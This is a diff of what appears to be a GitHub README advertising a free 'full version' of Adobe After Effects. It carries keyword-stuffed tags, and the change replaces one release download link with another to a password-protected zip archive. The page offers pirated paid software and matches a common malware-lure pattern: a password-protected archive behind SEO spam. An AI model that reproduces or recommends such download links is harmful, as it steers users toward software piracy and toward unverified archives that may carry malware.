@@ -8,7 +8,7 @@ Tags: After Effects, After Effects install , After Effects for free, free After 
 - Topics: After-Effects, motion-graphics, video-editing, free-software, visual-effects, design-tools, after-effects visual-effects animation-software adobe-after-effects after-effects-scripts after-effects-free after-effects-download adobe-after-effects-free after-effects-full-version adobe-after-effects-download after-effects-full after-effects-tutorial after-effects-plugin visual-effects-software visual-effects-pack after-effects-2025 after-effects-licence after-effects-all-features adobe-after-effects-2025 after-effects-features
 
 ## 🔗 Software Access  
-### Download: [After Effects](https://github.com/xyt0169/After-Effects-Full-PC/releases/download/After-Effects-Full-PC/After.Effects.PC.zip)
+### Download: [After Effects](https://github.com/xyt0169/After-Effects-Full-PC/releases/download/After-Effects-Full-PC/After.Effects.Full.zip)
 Password-2025  
 
 ## 🎉 Overview of After Effects  
